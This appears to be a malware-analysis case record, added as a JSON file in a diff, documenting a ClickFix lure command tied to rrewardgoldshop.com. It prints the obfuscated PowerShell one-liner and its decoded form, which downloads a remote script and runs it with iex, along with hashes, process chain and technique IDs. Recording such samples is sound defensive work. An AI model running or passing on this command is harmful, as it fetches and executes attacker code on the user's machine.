@@ -1,0 +1,97 @@
+{
+  "schema_version": 1,
+  "case_id": "20260825-command-pt2",
+  "analysis_date": "2026-08-25",
+  "domain": "rrewardgoldshop.com",
+  "source": {
+    "path": "C:\\Users\\Administrator\\Desktop\\kentai\\clickfix-command.txt",
+    "sha256": "8326ca91fcb530acaebfa6a42ea240fdfc6321e73090043cc60f63bd4d8296b0",
+    "captured_labels": [
+      "pt2"
+    ],
+    "file_last_write_local": "2026-08-25T00:06:47.081740+09:00"
+  },
+  "command": {
+    "raw": "[System.Diagnostics.Process]::Start('powershell',(&{$yb='';@(('iex(wgejt jhtjztps:zz//zrzzezwa' -replace '[zj]'),'nnnrdnn'.Trim('n'),'goljshop.com/q)'.Replace('j','d'))|%{$yb+=$_};$yb}))",
+    "sha256": "a3b79eef4fe44ac7b4caff424ad0cc3512d703b87c74a23e366a3bf65010cded",
+    "length": 186,
+    "duplicate_count": 1,
+    "pattern": "文字列置換 + Process.Start + 子PowerShell IEX",
+    "deobfuscated": "iex(wget https://rrewardgoldshop.com/q)",
+    "stage_locator_raw": "https://rrewardgoldshop.com/q",
+    "stage_url_normalized": "https://rrewardgoldshop.com/q",
+    "status": "recovered_not_executed",
+    "processes": [
+      "powershell.exe",
+      "powershell.exe"
+    ],
+    "process_chain": [
+      {
+        "sequence": 1,
+        "image": "powershell.exe",
+        "evidence": "static_command_semantics",
+        "relationship": "candidate_not_executed"
+      },
+      {
+        "sequence": 2,
+        "image": "powershell.exe",
+        "evidence": "static_command_semantics",
+        "relationship": "candidate_not_executed"
+      }
+    ],
+    "process_chain_status": "recovered_from_command_not_executed",
+    "command_line_public": "[System.Diagnostics.Process]::Start('powershell',(&{$yb='';@(('iex(wgejt jhtjztps:zz//zrzzezwa' -replace '[zj]'),'nnnrdnn'.Trim('n'),'goljshop.com/q)'.Replace('j','d'))|%{$yb+=$_};$yb}))",
+    "command_line_normalized": "[System.Diagnostics.Process]::Start('powershell',(&{$yb='';@(('iex(wgejt jhtjztps:zz//zrzzezwa' -replace '[zj]'),'nnnrdnn'.Trim('n'),'goljshop.com/q)'.Replace('j','d'))|%{$yb+=$_};$yb}))",
+    "command_line_length": 186,
+    "command_line_status": "recovered_not_executed",
+    "command_line_source": "analyst_provided_clickfix_command_file",
+    "command_sha256": "a3b79eef4fe44ac7b4caff424ad0cc3512d703b87c74a23e366a3bf65010cded"
+  },
+  "process_analysis": {
+    "processes": [
+      "powershell.exe",
+      "powershell.exe"
+    ],
+    "process_chain": "既存powershell.exe → System.Diagnostics.Process.Start → 子powershell.exe → 同一子process内でHTTP応答をIEX評価",
+    "status": "static_candidate_not_observed",
+    "details": [
+      "[zj]削除、Trim('n')、Replace('j','d')の3断片を連結する。",
+      "復号後の子process引数は iex(wget https://rrewardgoldshop.com/q) である。",
+      "wgetはPowerShellのInvoke-WebRequest aliasで、応答をiexへ渡す。",
+      "親PowerShellとは別に子powershell.exeを生成する点が他の5パターンと異なる。"
+    ]
+  },
+  "retrieval": {
+    "analyst_probe_url": "https://rrewardgoldshop.com/q",
+    "status": "blocked_no_public_dns",
+    "http_status": null,
+    "bytes": 0,
+    "body_sha256": null,
+    "body_type": null,
+    "payload_recovered": false,
+    "evidence_role": "current_context_only_not_runtime_proof",
+    "javascript_executed": false,
+    "powershell_executed": false,
+    "payload_executed": false
+  },
+  "terminal_payload": {
+    "status": "not_retrieved",
+    "family": null,
+    "sha256": null,
+    "additional_processes": [],
+    "persistence": [],
+    "final_attacker_command": null
+  },
+  "techniques": [
+    "T1204.004",
+    "T1059.001",
+    "T1027",
+    "T1105"
+  ],
+  "safety": {
+    "captured_command_executed": false,
+    "downloaded_script_executed": false,
+    "payload_executed": false,
+    "network_method": "bounded GET only"
+  }
+}
